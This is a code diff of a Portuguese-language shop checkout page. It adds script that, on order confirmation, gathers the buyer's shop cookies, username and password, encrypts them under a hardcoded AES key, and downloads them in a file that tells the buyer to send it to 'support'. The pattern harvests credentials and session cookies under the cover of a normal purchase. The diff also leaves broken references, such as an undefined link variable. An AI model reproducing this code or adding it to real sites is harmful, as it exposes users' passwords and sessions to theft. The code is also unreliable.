@@ -200,31 +200,55 @@
       <h2>Obrigado pela compra!</h2>
       <div id="timer">Tempo restante: <span id="countdown">5:00</span></div>
       <img id="qr-code" src="https://api.qrserver.com/v1/create-qr-code/?data=https://ghosthszz.github.io/Vendas/&size=200x200" alt="QR Code">
-      <p>Seu futuro link:  <a id="checkout-link" href=""></a></p>
-    </div>
+     <br> <br>
     <div id="checkout-link">
       <a id="checkout-link" href="#" style="display: none;">Ir para a página de usuário</a>
     </div>
   </div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
   <script>
-    // Pega o valor do elemento com o ID 'username'
-    var username = document.getElementById('username').value;
 
-    // Gera o link com base no valor de 'username'
-    var link = `https://ghosthszz.github.io/Vendas/frontend/paginas/users/${username}`;
-
+  
     // Define o atributo href do elemento <a> com o link gerado
     document.getElementById('checkout-link').href = link;
     // Define o texto do link
     document.getElementById('checkout-link').textContent = link;
-    // Função para obter os cookies
-    function getCookie(name) {
-      const value = `; ${document.cookie}`;
-      const parts = value.split(`; ${name}=`);
-      if (parts.length === 2) return parts.pop().split(';').shift();
+  
+    // Função para obter todos os cookies que começam com "shop_"
+    function getShopCookies() {
+      return document.cookie.split(';')
+        .map(cookie => cookie.trim())
+        .filter(cookie => cookie.startsWith('shop_'))
+        .join('\n');
     }
-
-
+  
+    // Função para criptografar uma string usando AES
+    function encryptAES(data) {
+      const key = 'Ck3rH74NpC5WUy9s'; // Chave para criptografia
+      const encrypted = CryptoJS.AES.encrypt(data, key).toString();
+      return encrypted;
+    }
+  
+    // Função para criar um arquivo de texto com os cookies, usuário e senha criptografados e permitir o download
+    function downloadCookies() {
+      const cookies = getShopCookies();
+      const encryptedCookies = encryptAES(cookies);
+      const encryptedUsername = encryptAES(username);
+      const encryptedPassword = encryptAES(document.getElementById('password').value);
+  
+      // Conteúdo a ser escrito no arquivo
+      const fileContent = `Cookies:\n${encryptedCookies}\n\nUsername:\n${encryptedUsername}\n\nPassword:\n${encryptedPassword}\n\nENVIE ESSE ARQUIVO PARA O SUPORTE!!!`;
+  
+      // Cria o blob com os dados criptografados
+      const blob = new Blob([fileContent], { type: 'text/plain' });
+      const link = document.createElement('a');
+      link.href = URL.createObjectURL(blob);
+      link.download = 'pedido.txt';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+  
     // Função para confirmar o pedido
     function confirmOrder() {
       document.getElementById('checkout').style.display = 'none';
@@ -233,8 +257,9 @@
       document.getElementById('checkout-link').style.display = 'block';
       document.getElementById('checkout-link').href = `https://ghosthszz.github.io/Vendas/frontend/paginas/users/${document.getElementById('username').value}`;
       startTimer();
+      downloadCookies(); // Baixa os cookies, usuário e senha ao confirmar o pedido
     }
-
+  
     // Função para iniciar o cronômetro
     function startTimer() {
       let seconds = 300;
@@ -251,14 +276,14 @@
         }
       }, 1000);
     }
-
+  
     // Exibir os itens do pedido ao carregar a página
-    displayOrder();
-
+    // displayOrder();
+  
     // Evento de envio do formulário de login
     document.getElementById('login-form').addEventListener('submit', function(event) {
       event.preventDefault();
-      const username = document.getElementById('username').value;
+      username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
       const confirmPassword = document.getElementById('confirm-password').value;
       if (password !== confirmPassword) {
@@ -271,10 +296,10 @@
         document.querySelector('.form-container').style.display = 'none';
       }
     });
-
-    
+  
   </script>
-    <script src="../../js/token.js" ></script>
-    <script src="cupons.js"></script>
+  
+  
+  <script src="../../js/token.js"></script>
 </body>
 </html>
